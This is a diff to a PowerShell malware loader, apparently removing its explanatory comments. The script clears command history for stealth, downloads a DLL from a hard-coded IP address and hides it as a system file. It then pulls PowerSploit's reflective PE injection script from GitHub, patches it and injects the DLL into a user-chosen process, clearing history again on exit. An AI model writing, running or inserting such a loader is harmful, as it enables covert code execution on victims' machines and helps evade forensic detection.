@@ -1,11 +1,11 @@
-﻿# Check for Administrator privileges
+
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "[-] Administrator privileges required" -ForegroundColor Red
     exit 1
 }
 
-# --- STEALTH: Disable and Clear PowerShell History ---
+
 $HistoryPreference = 'SilentlyContinue'
 if (Get-Module -ListAvailable PSReadLine) {
     Set-PSReadLineOption -HistorySaveStyle SaveNothing
@@ -14,17 +14,11 @@ Clear-History
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
 
 try {
-
-    # Configuration
     $url = "http://43.229.135.199/d3d10.dll"
     $fileName = "d3d10.dll"
     $filePath = "C:\ProgramData\$fileName"
     $maxRetries = 10
     $retryDelay = 3
-
-    # Write-Host "[+] Starting process: Download → Hide → Inject" -ForegroundColor Cyan
-
-    # Step 1: Remove old file if exists
     if (Test-Path $filePath) {
         # Write-Host "[+] Old file detected. Removing attributes..." -ForegroundColor Yellow
         try {
@@ -38,49 +32,35 @@ try {
             exit 1
         }
     }
-
-    # Step 2: Download with retry
-    # Write-Host "[+] Downloading from: $url" -ForegroundColor Yellow
     $success = $false
     $attempt = 0
 
     while (-not $success -and $attempt -lt $maxRetries) {
         $attempt++
-        # Write-Host "[Attempt $attempt/$maxRetries] Downloading..." -ForegroundColor Cyan
         try {
             $ProgressPreference = 'SilentlyContinue'
             Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing -ErrorAction Stop
             $success = $true
-            # Write-Host "[+] Download successful (Size: $((Get-Item $filePath).Length) bytes)" -ForegroundColor Green
         }
         catch {
-            # Write-Host "[-] Failed: $($_.Exception.Message)" -ForegroundColor Red
             if ($attempt -lt $maxRetries) { Start-Sleep -Seconds $retryDelay }
         }
     }
 
     if (-not $success) {
-        # Write-Host "[-] Download failed after all attempts" -ForegroundColor Red
         exit 1
     }
-
-    # Step 3: Hide the file
     try {
         $item = Get-Item $filePath -Force
         $item.Attributes = $item.Attributes -bor ([IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)
-        # Write-Host "[+] File hidden successfully (+H +S)" -ForegroundColor Green
     }
     catch {
         Write-Host "[-] Failed to hide file: $($_.Exception.Message)" -ForegroundColor Red
     }
 
-    # Step 4: Load and PATCH Reflective PE Injection script
     $reflectiveUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
-    # Write-Host "[+] Loading and Patching Reflective Injection script..." -ForegroundColor Yellow
     try {
         $scriptContent = (New-Object Net.WebClient).DownloadString($reflectiveUrl)
-    
-        # Patch "Ambiguous match found" using explicit Type arrays (more robust)
         $scriptContent = $scriptContent -replace 
         '\$GetModuleHandle = \$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', 
         '$$GetModuleHandle = $$UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
@@ -90,49 +70,26 @@ try {
         '$$GetProcAddress = $$UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
     
         IEX $scriptContent
-        # Write-Host "[+] Reflective script patched and loaded successfully" -ForegroundColor Green
     }
     catch {
-        # Write-Host "[-] Failed to load/patch reflective script: $($_.Exception.Message)" -ForegroundColor Red
         exit 1
     }
-
-    # Step 5: Read DLL bytes and perform Reflective Injection
-    # Write-Host "[+] Reading DLL bytes and preparing injection..." -ForegroundColor Yellow
     try {
         $dllBytes = [IO.File]::ReadAllBytes($filePath)
-    
-        # Prompt for target PID
         $targetPid = Read-Host "PID"
     
         if (-not $targetPid -or $targetPid -notmatch '^\d+$') {
             # Write-Host "[-] Invalid PID entered" -ForegroundColor Red
             exit 1
         }
-    
-        # Write-Host "[+] Injecting into PID: $targetPid ..." -ForegroundColor Cyan
-    
-        # Perform reflective injection (updated script should handle ambiguous better)
         Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId ([int]$targetPid) -ErrorAction Stop
-    
-        # Write-Host "[+] Injection successful! (Reflective, in-memory)" -ForegroundColor Green
-        # Write-Host "    DLL file: $filePath (hidden)" -ForegroundColor Cyan
-        # Write-Host "    Target PID: $targetPid" -ForegroundColor Cyan
     }
     catch {
     }
-
-    # Pause before closing window
-    # Write-Host ""
-    # Write-Host "Injection process completed." -ForegroundColor Magenta
-    # Write-Host "Press Enter to close this window..." -ForegroundColor White
-    # $null = Read-Host
 }
 finally {
-    # --- STEALTH: Final History Cleanup ---
     if (Get-Module -PSProvider -Name PSReadLine) {
         [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
     }
     Clear-History
-    # Write-Host "[+] History cleaned. Exiting..." -ForegroundColor Cyan
 }
